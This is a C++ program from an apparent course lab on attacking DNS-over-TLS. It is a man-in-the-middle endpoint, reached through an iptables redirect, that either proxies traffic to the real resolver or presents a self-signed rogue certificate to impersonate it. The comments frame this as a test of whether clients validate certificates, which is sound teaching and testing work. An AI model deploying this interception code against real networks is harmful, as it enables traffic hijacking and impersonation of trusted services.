/*
 * tls_endpoint.cpp — Phase 7, §7.3 attempt (ii): impersonate the
 * resolver with a rogue certificate.
 *
 * This is DELIBERATELY NOT a libpcap packet forger, unlike every
 * other attack program in this assignment. Completing a
 * cryptographically valid TLS handshake requires an actual TLS
 * stack negotiating real key material -- there is no way to
 * accomplish that by crafting raw bytes with libpcap, the same way
 * Phases 2-4/6's forgers craft raw DNS bytes. This program uses
 * ordinary POSIX sockets and OpenSSL instead, for this one piece
 * only.
 *
 * How traffic reaches it: entrypoint.sh keeps an iptables NAT rule
 * toggled by the SAME /tmp/impersonate.on flag dns_interceptor.cpp
 * already checks -- `-j REDIRECT --to-port 8853` on local TCP/853
 * traffic (the attacker is diverted BOTH directions of client<->
 * resolver traffic via edge-router's routes, so any TCP/853 packet
 * destined to the resolver that arrives here gets locally redirected
 * to this program instead, while dns_interceptor simultaneously stops
 * relaying that same traffic -- the two mechanisms are flag-gated
 * never to be active on TCP/853 at the same time).
 *
 * Two modes, selected per NEW connection by the same flag file:
 *
 *   Pass-through (default, flag absent): a plain, no-TLS-involved TCP
 *   proxy to the REAL resolver at 172.16.2.10:853. This is what keeps
 *   §7.2 Verify and §7.3 attempts (i)/(iii) working correctly even
 *   though all TCP/853 traffic now physically transits this
 *   container -- when not actively impersonating, it's just a
 *   transparent bump in the wire, same spirit as every other
 *   attacker in this assignment when its forging is switched off.
 *
 *   Impersonate (flag present): terminates the TLS handshake itself,
 *   presenting the ROGUE certificate (same DNS name,
 *   "resolver.cs6008.local", but self-signed -- NOT chaining to the
 *   private CA the client trusts). For a client that validates
 *   properly (both postures in this phase are required to -- the
 *   spec disallows -k/insecure-bypass), SSL_accept() here simply
 *   fails: the client aborts the handshake before ever sending a
 *   query. That failure, logged below, IS the expected, correct
 *   result -- the interesting finding for the report is that this
 *   attempt doesn't work directly against a validating client at
 *   all, regardless of which cleartext-fallback posture it has.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o tls_endpoint tls_endpoint.cpp -lssl -lcrypto -lpthread
 * Usage: ./tls_endpoint
 *   REAL_RESOLVER_IP env var -- default "172.16.2.10"
 *   ROGUE_CERT / ROGUE_KEY env vars -- default "/app/pki/rogue.crt" / "/app/pki/rogue.key"
 */

#include <openssl/err.h>
#include <openssl/ssl.h>

#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <poll.h>
#include <string>
#include <sys/socket.h>
#include <sys/stat.h>
#include <thread>
#include <unistd.h>

namespace {

constexpr const char *IMPERSONATE_FLAG_PATH = "/tmp/impersonate.on";
constexpr int LISTEN_PORT = 8853;

bool impersonate_is_on() {
    struct stat st;
    return stat(IMPERSONATE_FLAG_PATH, &st) == 0;
}

int connect_to_real_resolver(const std::string &ip) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(853);
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) != 1) { close(fd); return -1; }
    if (connect(fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0) { close(fd); return -1; }
    return fd;
}

void proxy_bidirectional(int a, int b) {
    pollfd fds[2] = {{a, POLLIN, 0}, {b, POLLIN, 0}};
    uint8_t buf[8192];
    while (true) {
        int r = poll(fds, 2, -1);
        if (r <= 0) break;
        bool closed = false;
        for (int i = 0; i < 2 && !closed; i++) {
            if (!(fds[i].revents & (POLLIN | POLLHUP | POLLERR))) continue;
            const int src = (i == 0) ? a : b;
            const int dst = (i == 0) ? b : a;
            const ssize_t n = recv(src, buf, sizeof(buf), 0);
            if (n <= 0) { closed = true; break; }
            ssize_t off = 0;
            while (off < n) {
                const ssize_t w = send(dst, buf + off, static_cast<size_t>(n - off), 0);
                if (w <= 0) { closed = true; break; }
                off += w;
            }
        }
        if (closed) break;
    }
}

void handle_passthrough(int client_fd, std::string real_resolver_ip) {
    fprintf(stderr, "[tls_endpoint] pass-through: proxying to real resolver %s:853\n", real_resolver_ip.c_str());
    const int up_fd = connect_to_real_resolver(real_resolver_ip);
    if (up_fd < 0) {
        fprintf(stderr, "[tls_endpoint] could not reach real resolver\n");
        close(client_fd);
        return;
    }
    proxy_bidirectional(client_fd, up_fd);
    close(up_fd);
    close(client_fd);
}

void handle_impersonate(int client_fd, SSL_CTX *ctx) {
    fprintf(stderr, "[tls_endpoint] IMPERSONATE: presenting rogue cert for resolver.cs6008.local\n");
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_fd);
    const int rc = SSL_accept(ssl);
    if (rc <= 0) {
        fprintf(stderr, "[tls_endpoint] handshake rejected by the client (expected for a client that validates "
                        "the cert chain properly -- our rogue cert isn't signed by the trusted CA)\n");
        ERR_print_errors_fp(stderr);
    } else {
        fprintf(stderr, "[tls_endpoint] !! handshake SUCCEEDED -- a client just accepted an untrusted cert !!\n");
        uint8_t buf[2048];
        SSL_read(ssl, buf, sizeof(buf));
        fprintf(stderr, "[tls_endpoint] (not bothering to craft a well-formed DoT response here -- "
                        "the handshake succeeding at all is already the finding worth reporting)\n");
    }
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client_fd);
}

} // namespace

int main() {
    const char *resolver_ip_env = getenv("REAL_RESOLVER_IP");
    const std::string real_resolver_ip = resolver_ip_env ? resolver_ip_env : "172.16.2.10";
    const char *cert_env = getenv("ROGUE_CERT");
    const std::string cert_path = cert_env ? cert_env : "/app/pki/rogue.crt";
    const char *key_env = getenv("ROGUE_KEY");
    const std::string key_path = key_env ? key_env : "/app/pki/rogue.key";

    SSL_library_init();
    SSL_load_error_strings();
    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (!ctx) { fprintf(stderr, "[tls_endpoint] SSL_CTX_new failed\n"); return 1; }
    if (SSL_CTX_use_certificate_file(ctx, cert_path.c_str(), SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, key_path.c_str(), SSL_FILETYPE_PEM) <= 0) {
        fprintf(stderr, "[tls_endpoint] could not load rogue cert/key from %s / %s\n", cert_path.c_str(), key_path.c_str());
        ERR_print_errors_fp(stderr);
        return 1;
    }

    const int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) { perror("socket"); return 1; }
    int yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(LISTEN_PORT);
    if (bind(srv, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0) { perror("bind"); return 1; }
    if (listen(srv, 16) < 0) { perror("listen"); return 1; }

    fprintf(stderr, "[tls_endpoint] listening on 127.0.0.1:%d (reached via iptables REDIRECT of diverted TCP/853, "
                    "toggled by /tmp/impersonate.on)\n", LISTEN_PORT);

    while (true) {
        sockaddr_in cliaddr{};
        socklen_t len = sizeof(cliaddr);
        const int fd = accept(srv, reinterpret_cast<sockaddr *>(&cliaddr), &len);
        if (fd < 0) continue;
        if (impersonate_is_on()) {
            std::thread(handle_impersonate, fd, ctx).detach();
        } else {
            std::thread(handle_passthrough, fd, real_resolver_ip).detach();
        }
    }
}
